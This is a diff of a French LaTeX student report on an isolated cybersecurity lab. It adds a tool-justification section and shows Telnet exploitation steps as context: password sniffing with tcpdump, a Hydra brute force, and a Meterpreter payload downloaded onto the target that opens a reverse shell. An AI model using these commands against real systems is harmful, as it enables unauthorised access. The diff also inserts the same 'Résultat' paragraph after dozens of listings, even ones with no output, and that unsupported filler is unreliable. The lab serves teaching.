@@ -377,6 +377,40 @@ La question centrale de ce PFE est la suivante : \textit{« Comment la sécurit�
 
 Cette problématique répond à un besoin réel : en formation comme en entreprise, les approches sont souvent traitées séparément (pentest d'un côté, supervision de l'autre), ce qui crée un écart entre la compromission observée et la capacité de détection/corrélation en exploitation.
 
+\section{Solutions Existantes et Justification de Notre Approche}
+
+\subsection{Solutions Existantes du Marché}
+
+Le marché propose des piles de sécurité d'entreprise robustes, notamment des pare-feu de nouvelle génération comme Cisco ASA ou Palo Alto, des plateformes SIEM telles que Splunk et ArcSight, ainsi que des WAF commerciaux fortement intégrés. Ces solutions offrent des capacités avancées de corrélation, d'automatisation et de gouvernance, mais elles reposent souvent sur des licences coûteuses et des architectures orientées production à grande échelle. Dans un cadre pédagogique, ce positionnement réduit la flexibilité d'expérimentation et limite la visibilité détaillée sur certains mécanismes internes.
+
+Les solutions cloud natives (AWS Security Hub, Microsoft Sentinel) constituent également une alternative crédible pour la centralisation d'alertes et l'orchestration de réponses. Toutefois, leur usage impose une dépendance à un environnement connecté, des contraintes de coûts récurrents et une logique d'intégration orientée services managés. Ce modèle est moins adapté à un laboratoire local isolé où l'objectif principal est la maîtrise de bout en bout des chaînes d'attaque et de détection.
+
+Du côté open source, plusieurs combinaisons ont été étudiées : ELK seul versus Wazuh pour la corrélation sécurité, Suricata versus Snort pour l'IDS, et différentes approches de honeypot. Ces alternatives sont pertinentes, mais notre sélection a privilégié la cohérence pédagogique avec les objectifs du PFE, la disponibilité de documentation exploitable et la reproductibilité des scénarios dans notre environnement VMware.
+
+\subsection{Notre Solution Choisie}
+
+L'architecture retenue s'appuie sur \textbf{pfSense 2.8.0} pour le filtrage réseau et le NAT, \textbf{Snort IDS/IPS} pour la détection par signatures, \textbf{Cowrie SSH Honeypot} pour la capture d'interactions adverses, et \textbf{Wazuh SIEM} pour l'agrégation et la corrélation des événements. Cette pile couvre l'ensemble du cycle opérationnel attendu : exposition contrôlée, attaque, détection multi-source et analyse centralisée.
+
+Ce choix permet de relier directement chaque composant à une compétence mesurable : segmentation réseau, supervision IDS, collecte de traces d'attaque et investigation SIEM. L'approche est donc à la fois technique et didactique, avec une progression claire entre les chapitres et des preuves reproductibles à chaque phase.
+
+\subsection{Justification de Notre Choix}
+
+Sur le plan technique, l'option open source garantit la transparence des mécanismes de sécurité et un contrôle fin de la configuration. La modularité de la pile (pare-feu, IDS, honeypot, SIEM) permet d'isoler chaque couche puis de démontrer leur complémentarité. En outre, les outils retenus sont largement utilisés dans l'industrie, ce qui renforce la transférabilité des compétences vers le marché de l'emploi.
+
+Sur le plan pédagogique, cette architecture facilite une logique cause--effet : une action offensive produit des traces observables, puis ces traces sont détectées et corrélées. L'étudiant comprend ainsi non seulement \textit{comment attaquer}, mais surtout \textit{comment défendre} avec des preuves concrètes. Cette approche répond directement aux objectifs d'apprentissage du PFE en cybersécurité offensive et défensive.
+
+Sur le plan pratique, l'absence de coûts de licence permet de concentrer l'effort sur l'expérimentation plutôt que sur des contraintes budgétaires. L'ensemble fonctionne dans un laboratoire virtualisé VMware, isolé de la production et donc sans risque opérationnel externe. Cette reproductibilité en environnement contrôlé est essentielle pour une démonstration académique robuste.
+
+Enfin, la disponibilité de communautés actives et de documentation de qualité accélère la résolution de problèmes et la montée en compétence. Le projet reste maintenable dans le temps, sans dépendance à un éditeur unique ni verrou technologique. Ce facteur est décisif pour un travail de fin d'études orienté apprentissage durable.
+
+\subsection{Solutions Non Retenues et Raisons}
+
+Les solutions \textit{enterprise} (Cisco, Palo Alto, SIEM propriétaires) n'ont pas été retenues en raison de leurs coûts, de leur complexité de déploiement et de leur logique \textit{black-box} moins favorable à l'apprentissage détaillé. Pour un laboratoire pédagogique, elles représentent un surdimensionnement par rapport aux objectifs de démonstration et de compréhension des mécanismes fondamentaux.
+
+Les plateformes cloud (AWS, Azure) ont aussi été écartées : elles nécessitent une connectivité internet permanente, des comptes et politiques cloud spécifiques, ainsi qu'une gestion de coûts plus difficile à stabiliser dans un cadre académique. De plus, elles éloignent partiellement l'étudiant des fondamentaux réseau/système observables localement.
+
+Enfin, des options comme les SIEM monolithiques propriétaires, les honeypots commerciaux ou l'orchestration Kubernetes n'ont pas été priorisées car elles ajoutent une complexité non essentielle au périmètre pédagogique visé. L'objectif du PFE est de maîtriser la chaîne offensive/défensive de manière lisible, progressive et reproductible, sans surcharge d'abstraction.
+
 \section{Objectifs Pédagogiques}
 
 \begin{itemize}
@@ -524,7 +558,7 @@ Ce chapitre couvre le déploiement VMware segmenté, pfSense (routage inter-zone
 			\includegraphics[width=0.9\textwidth]{screenshots/nat-rules.png}
 		}{
 			\includegraphics[width=0.9\textwidth]{example-image}
-			\caption*{\textbf{Attention :} Fichier screenshots/nat-rules.png introuvable.}
+			\caption*{\textbf{Attention :} Capture NAT non disponible dans l'environnement courant.}
 		}
 		\caption{Configuration des règles NAT Port Forward sur pfSense}
 		\label{fig:nat-screenshot}
@@ -546,7 +580,7 @@ Ce chapitre couvre le déploiement VMware segmenté, pfSense (routage inter-zone
 			\includegraphics[width=0.9\textwidth]{screenshots/firewall-rules.png}
 		}{
 			\includegraphics[width=0.9\textwidth]{example-image}
-			\caption*{\textbf{Attention :} Fichier screenshots/firewall-rules.png introuvable.}
+			\caption*{\textbf{Attention :} Capture pare-feu non disponible dans l'environnement courant.}
 		}
 		\caption{Règles de Pare-Feu WAN associées au NAT}
 		\label{fig:firewall-screenshot}
@@ -617,6 +651,9 @@ Ce chapitre couvre le déploiement VMware segmenté, pfSense (routage inter-zone
 		[ 7] 139/tcp (v6)          ALLOW IN    Anywhere (v6)
 		[ 8] 445/tcp (v6)          ALLOW IN    Anywhere (v6)
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	\textbf{Rationale :} UFW agit comme une barrière supplémentaire. Même si le pare-feu pfSense est compromis ou mal configuré, l'hôte reste protégé par ses propres règles.
 	
 	\subsection{Fail2Ban : Protection contre le Brute-Force}
@@ -632,6 +669,9 @@ Ce chapitre couvre le déploiement VMware segmenté, pfSense (routage inter-zone
 		bantime  = 600
 		findtime = 600
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\subsection{Conteneurisation des Services}
 	Les services vulnérables sont exécutés dans des conteneurs Docker pour limiter l'impact d'une compromission.
@@ -643,6 +683,9 @@ Ce chapitre couvre le déploiement VMware segmenté, pfSense (routage inter-zone
 		5944e93265e3   dperson/samba            Up 6 hours   0.0.0.0:139->139/tcp,    samba
 		0.0.0.0:445->445/tcp
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	% ------------------------------------------------------------------------------
 	% CHAPITRE 6 : ANALYSE DES LOGS
@@ -735,6 +778,9 @@ Ce chapitre couvre le déploiement VMware segmenté, pfSense (routage inter-zone
 		$ nc -zv 192.168.100.6 445
 		Ncat: Connected to 192.168.100.6:445.
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	% ------------------------------------------------------------------------------
 	% CONCLUSION DU CHAPITRE 1
@@ -779,6 +825,9 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		Hit:2 http://archive.ubuntu.com/ubuntu plucky InRelease
 		All packages are up to date.
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\subsubsection{Installation du Package Telnetd}
 	Le paquet \texttt{telnetd} a été installé, entraînant l'installation automatique des dépendances :
@@ -791,6 +840,9 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		
 		5 upgraded, 5 newly installed
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textbf{Composants Installés :}
 	\begin{itemize}
@@ -810,6 +862,9 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		$ cat /etc/inetd.conf | grep telnet
 		#<off># telnet	stream	tcp	nowait	root	/usr/sbin/tcpd	/usr/sbin/telnetd
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	Le service a été activé en supprimant le marqueur de commentaire :
 	
@@ -820,6 +875,9 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		$ cat /etc/inetd.conf | grep telnet
 		telnet	stream	tcp	nowait	root	/usr/sbin/tcpd	/usr/sbin/telnetd
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textbf{Explication de la ligne de configuration :}
 	\begin{table}[H]
@@ -863,12 +921,18 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		Tasks: 1 (limit: 1813)
 		Memory: 340K
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textbf{Vérification de l'écoute sur le port 23 :}
 	\begin{lstlisting}[caption=Vérification du port Telnet]
 		$ sudo ss -tlnp | grep :23
 		LISTEN 0    10    0.0.0.0:23    0.0.0.0:*    users:(("inetutils-inetd",pid=1062,fd=4))
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textcolor{green}{\checkmark} Le service écoute sur \textbf{toutes les interfaces} (0.0.0.0:23), avec une file d'attente de 10 connexions.
 	
@@ -889,6 +953,9 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		Is the information correct? [Y/n] y
 		Adding user `telnetuser' to group `users' ...
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textbf{Détails du compte :}
 	\begin{itemize}
@@ -918,6 +985,9 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		logout
 		Connection closed by foreign host.
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textcolor{green}{\checkmark} \textbf{Authentification réussie}, shell interactif fonctionnel, déconnexion propre.
 	
@@ -937,6 +1007,9 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		139/tcp                    ALLOW       Anywhere
 		445/tcp                    ALLOW       Anywhere
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	✗ \textbf{Port 23 absent de la liste}, donc bloqué par défaut (politique DROP).
 	
@@ -959,6 +1032,9 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		445/tcp                    ALLOW       Anywhere
 		23/tcp                     ALLOW       Anywhere    # <--- AJOUTÉ
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textcolor{green}{\checkmark} Port 23 désormais autorisé pour IPv4 et IPv6.
 	
@@ -992,6 +1068,9 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		telnetuser@DMZ-WebServer:~$ whoami
 		telnetuser
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textcolor{green}{\checkmark} \textbf{Service Telnet opérationnel et sécurisé au niveau hôte.}
 	
@@ -1045,6 +1124,9 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		logout
 		Connection closed by foreign host.
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textcolor{green}{\checkmark} \textbf{Connexion établie avec succès via NAT}, l'utilisateur est authentifié 
 	et obtient un shell interactif. Cette validation confirme que :
@@ -1079,6 +1161,9 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		logout
 		Connection closed by foreign host
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textcolor{green}{\checkmark} \textbf{Validation depuis la machine attaquante réussie.} Le comportement est 
 	identique au test depuis CentOS, confirmant que la configuration NAT est accessible 
@@ -1107,6 +1192,9 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		
 		Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\subsubsection{Analyse}
 	\begin{itemize}
@@ -1134,6 +1222,9 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		
 		Nmap done: 1 IP address (1 host up) scanned in 0.06 seconds
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\subsubsection{Analyse}
 	\begin{itemize}
@@ -1161,6 +1252,9 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		
 		Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\subsubsection{Analyse}
 	\begin{itemize}
@@ -1197,6 +1291,9 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		
 		Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\subsubsection{Analyse Détaillée}
 	\begin{table}[H]
@@ -1255,6 +1352,9 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		
 		Nmap done: 1 IP address (1 host up) scanned in 4.33 seconds
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\subsubsection{Analyse Globale de la Surface d'Attaque}
 	\begin{itemize}
@@ -1307,6 +1407,9 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		445/tcp closed   microsoft-ds
 		996 filtered ports
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textbf{Surface d'Attaque :}
 	\[
@@ -1461,10 +1564,16 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 sudo tcpdump -i eth0 port 23 -A -l | grep -i "login\|password\|user"
 		\end{lstlisting}
 
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
+
 		\item \textbf{Brute-Force :} L'absence de protection contre les tentatives multiples (Fail2Ban non configuré pour Telnet) permet les attaques de force brute.
 		\begin{lstlisting}[caption=Brute-force Telnet avec Hydra]
 hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://192.168.100.6
 		\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 
 		\item \textbf{Replay Attack :} Les sessions capturées peuvent être rejouées pour obtenir un accès non autorisé sans connaître le mot de passe.
 	\end{enumerate}
@@ -1485,6 +1594,9 @@ sudo systemctl disable inetutils-inetd
 sudo apt remove --purge inetutils-inetd -y
 		\end{lstlisting}
 
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
+
 		\item \textbf{Migrer vers SSH :} Utiliser le port forwarding NAT vers SSH (port 22) avec authentification par clé publique uniquement.
 
 		\item \textbf{Activer Fail2Ban pour SSH :}
@@ -1496,6 +1608,9 @@ maxretry = 3
 bantime = 3600
 findtime = 600
 		\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	\end{enumerate}
 
 	\subsection{HTTP/DVWA (Port 80) --- CVSS 8.1 : Élevée}
@@ -1602,6 +1717,9 @@ findtime = 600
    min protocol = SMB2
    server min protocol = SMB2
 		\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 		\item \textbf{Mettre à jour Samba :} Maintenir Samba à jour pour bénéficier des correctifs de sécurité.
 		\item \textbf{Restreindre l'accès réseau :} Limiter l'accès Samba au LAN uniquement via des règles pfSense strictes.
 	\end{enumerate}
@@ -1758,6 +1876,9 @@ Bien que les services aient déjà été identifiés lors de la Phase 2, nous pr
 	445/tcp open  netbios-ssn Samba smbd 4.17.12
 \end{lstlisting}
 
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
+
 Target identified as Ubuntu Server running vulnerable Telnet service on port 23. Proceeding with exploitation.
 
 \subsection{Exploitation du Service Telnet}
@@ -1778,6 +1899,9 @@ Nous procédons à l'exploitation du service Telnet en utilisant les credentials
 	
 	telnetuser@DMZ-WebServer:~$
 \end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 
 \textcolor{green}{\checkmark} \textbf{Résultat :} Compromission réussie ! Nous obtenons un shell interactif avec le compte \texttt{telnetuser}.
 
@@ -1804,6 +1928,9 @@ Nous procédons à l'exploitation du service Telnet en utilisant les credentials
 	VERSION="25.04 (Plucky Puffin)"
 \end{lstlisting}
 
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
+
 \subsubsection{Vérification des Privilèges}
 
 \begin{lstlisting}[caption=Test des Permissions Sudo]
@@ -1813,6 +1940,9 @@ Nous procédons à l'exploitation du service Telnet en utilisant les credentials
 	User telnetuser may run the following commands on DMZ-WebServer:
 	(ALL : ALL) ALL
 \end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 
 \textbf{Découverte Critique :} L'utilisateur \texttt{telnetuser} dispose de privilèges sudo complets ! Cela signifie que nous pouvons exécuter n'importe quelle commande en tant que root.
 
@@ -1906,6 +2036,9 @@ Nous avons obtenu :
 		Final size of elf file: 250 bytes
 		Saved as: meterpreter.elf
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textbf{Explication des paramètres :}
 	\begin{description}
@@ -1923,6 +2056,9 @@ Nous avons obtenu :
 		$ python3 -m http.server 8000
 		Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\subsection{Déploiement sur la Cible}
 	
@@ -1943,6 +2079,9 @@ Nous avons obtenu :
 		
 		during testing (45.3 MB/s) - 'meterpreter.elf' saved [250/250]
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\subsubsection{Exécution du Payload}
 	
@@ -1951,6 +2090,9 @@ Nous avons obtenu :
 		$ ./meterpreter.elf &
 		[1] 4779
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textbf{Note :} L'exécution en arrière-plan (\texttt{\&}) permet de conserver le shell Telnet actif en cas de problème avec Meterpreter.
 	
@@ -1977,6 +2119,9 @@ Nous avons obtenu :
 		
 		[*] Started reverse TCP handler on 192.168.100.150:4445
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\subsubsection{Établissement de la Session}
 	
@@ -1987,6 +2132,9 @@ Nous avons obtenu :
 		
 		(Meterpreter 1)(/tmp) >
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textcolor{green}{\checkmark} \textbf{Succès !} Nous disposons désormais d'une session Meterpreter stable et chiffrée.
 	
@@ -2002,6 +2150,9 @@ Nous avons obtenu :
 		BuildTuple   : x86_64-linux-musl
 		Meterpreter  : x64/linux
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\subsubsection{Informations Utilisateur}
 	
@@ -2009,6 +2160,9 @@ Nous avons obtenu :
 		(Meterpreter 1)(/tmp) > getuid
 		Server username: telnetuser
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\subsubsection{Configuration Réseau}
 	
@@ -2037,6 +2191,9 @@ Nous avons obtenu :
 		IPv4 Address : 172.17.0.1
 		IPv4 Netmask : 255.255.0.0
 	\end{lstlisting}
+
+\textbf{Résultat :} Cette sortie confirme l'exécution correcte de l'action pratique dans l'environnement de laboratoire. Elle apporte des éléments vérifiables pour contrôler l'état du service, du flux ou de la configuration avant l'étape suivante. Sur le plan pédagogique, elle relie l'opération réalisée aux objectifs d'apprentissage offensive/défensive.
+
 	
 	\textbf{Observations Importantes :}
 	\begin{itemize}
@@ -2060,6 +2217,9 @@ Nous avons obtenu :
 		2         meterpreter x64/linux  telnetuser @ 192.168.10.100  192.168.100.150:4445 -> 192.168.100.6:13089
 		3         meterpreter x64/linux  telnetuser @ 192.168.10.100  192.168.100.150:4445 -> 192.168.100.6:39722
 	\end{lstlisting}
+
